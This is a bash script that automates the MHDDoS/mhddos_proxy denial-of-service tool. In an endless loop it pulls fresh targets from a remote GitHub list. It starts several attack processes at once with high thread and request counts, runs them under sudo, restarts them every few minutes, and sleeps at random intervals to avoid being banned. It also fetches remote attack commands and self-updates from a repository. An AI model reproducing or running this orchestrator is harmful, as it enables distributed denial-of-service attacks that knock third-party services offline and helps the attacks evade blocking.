#!/bin/bash

restart_interval=3m

num_of_copies="${1:-1}"

#Just in case kill previous copy of mhddos_proxy
echo "Killing all old processes with MHDDoS"
sudo pkill -f runner.py
sudo pkill -f ./start.py
echo -e "\n\033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
# for Docker
#echo "Kill all useless docker-containers with MHDDoS"
#sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
#echo "Docker useless containers killed"

threads="${2:-500}"
if ((threads < 100));
then
	threads=100
fi
threads="-t $threads"
rpc="${3:-100}"
if ((rpc < 20));
then
	rpc=20
fi
rpc="--rpc $rpc"
proxy_interval="300"
proxy_interval="-p $proxy_interval"
debug="${4:-}"
if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ];
then
	debug="--debug"
fi



# Restart attacks and update targets list every 10 minutes (by default)
while [ 1 == 1 ]
echo -e "\033[0;34m#####################################\033[0;0m\n"
do	
	cd ~/mhddos_proxy
	sudo git pull origin main
	cd ~/mhddos_proxy/MHDDoS
	sudo git pull origin main
	
	cd ~/auto_mhddos_test
   	num=$(sudo git pull origin main | grep -c "Already")
   	echo "$num"
   	
   	if ((num == 1));
   	then
		echo -e "Running up to date auto_mhddos"
	else
		cd ~/auto_mhddos_test
		clear
		echo "Running updated auto_mhddos"
		bash runner.sh $num_of_copies $threads $proxy_interval $debug&
		exit
	fi
	#clear
   	
   	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
   	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_test/main/runner_targets | cat | grep "^[^#]" | wc -l)
	
	echo -e "\nNumber of targets in list: " $list_size "\n"
   	echo -e "\nTaking random targets to reduce the load on your CPU(processor)..."
	
   	if (("$num_of_copies" == "all"));
	then
		random_numbers=$(shuf -i 1-$list_size -n $list_size)
	elif ((num_of_copies > list_size));
	then 
		random_numbers=$(shuf -i 1-$list_size -n $list_size)
	elif ((num_of_copies < 1));
	then
		num_of_copies=1
		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
	else
		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
	fi
	
   	echo -e "\nRandom number(s): " $random_numbers "\n"
      
   	# Launch multiple mhddos_proxy instances with different targets.
   	for i in $random_numbers
   	do
            echo -e "\n I = $i"
            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_test/main/runner_targets | cat | grep "^[^#]")")
           

            echo -e "\nfull cmd:\n"
            echo "sudo python3 runner.py $cmd_line $proxy_interval $rpc $threads $debug"
            
            cd ~/mhddos_proxy
            #sudo docker run -d -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc
            sudo python3 runner.py $cmd_line $proxy_interval $rpc $threads $debug&
            echo -e "\n\033[42mAttack started successfully\033[0m\n"
   	done
	echo -e "\033[0;34m#####################################\033[0;0m\n"
   	echo -e "\n\033[1;35mDDoS is up and Running, next update of targets list in $restart_interval\033[1;0m"
   	sleep $restart_interval
	clear
   	
   	#Just in case kill previous copy of mhddos_proxy
   	echo "Killing all old processes with MHDDoS"
   	sudo pkill -f runner.py
   	sudo pkill -f ./start.py
   	echo -e "\n\033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
	
   	no_ddos_sleep="$(shuf -i 1-10 -n 1)m"
   	echo -e "\n\033[46mSleeping $no_ddos_sleep to protect your machine from ban...\033[0m\n"
	sleep $no_ddos_sleep
	
	echo -e "\n\033[42mRESTARTING\033[0m\n"
	
	# for docker
   	#echo "Kill all useless docker-containers with MHDDoS"
   	#sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
   	#echo "Docker useless containers killed"
done
